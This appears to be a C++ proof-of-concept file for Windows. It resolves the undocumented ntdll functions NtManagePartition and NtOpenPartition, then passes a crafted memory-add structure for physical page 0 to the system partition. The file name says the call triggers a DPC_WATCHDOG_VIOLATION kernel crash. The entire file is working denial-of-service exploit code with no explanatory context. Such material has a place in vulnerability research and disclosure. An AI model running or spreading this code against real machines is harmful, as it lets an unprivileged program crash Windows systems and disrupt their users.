// DPC_WATCHDOG_VIOLATION.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "windows.h"
#include "stdio.h"


#define ulong unsigned long
#define ulonglong unsigned long long
#define ULONG unsigned long
#define ULONGLONG unsigned long long
#define ushort unsigned short
#define USHORT unsigned short
#define uchar unsigned char
#define UCHAR unsigned char

struct _TAIL
{
	ulonglong Pfn;
	ulonglong NumberOfBits;
};


//size 020
struct _PART_ADD_MEMORY_USER
{
	ulong Flags;
	ulong NumberOfChunks;
	ulonglong Output;//at 0x8
	_TAIL Tail[1];
};



typedef int(*fNtOpenPartition)(HANDLE* pOutHandle,ulonglong DesiredAccess,ulonglong pObjAttr);
typedef int(*fNtManagePartition)(HANDLE hPartition,HANDLE hSecondaryPartition,ulonglong InfoClass,ulonglong pInfo,ulonglong InfoLength);


fNtOpenPartition NtOpenPartition;
fNtManagePartition NtManagePartition = 0;



//DPC Watchdog
void NtManagePartition_POC()
{

	_PART_ADD_MEMORY_USER* pUserX = (_PART_ADD_MEMORY_USER*)LocalAlloc(LMEM_ZEROINIT,sizeof(_PART_ADD_MEMORY_USER));
	if(pUserX)
	{
		pUserX->Flags = 2;
		pUserX->NumberOfChunks = 1;
		pUserX->Tail[0].Pfn = 0;
		pUserX->Tail[0].NumberOfBits   = 1;

		int ret = NtManagePartition( (HANDLE)-2 /* System Partition */,
									(HANDLE)0,
									0x4,
									(ulonglong)pUserX,
									0x20);
		printf("NtManagePartition, ret: %X\r\n",ret);
		LocalFree(pUserX);
	}
}

void Resolve()
{
	HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
	NtManagePartition = (fNtManagePartition)GetProcAddress(hNtdll,"NtManagePartition");
	NtOpenPartition = (fNtOpenPartition)GetProcAddress(hNtdll,"NtOpenPartition");

	if( (!NtManagePartition)||(!NtOpenPartition))
	{
		printf("OS not supported\r\n");
		ExitProcess(-1);
	}
	return;
}


int _tmain(int argc, _TCHAR* argv[])
{
	Resolve();
	NtManagePartition_POC();
	return 0;
}

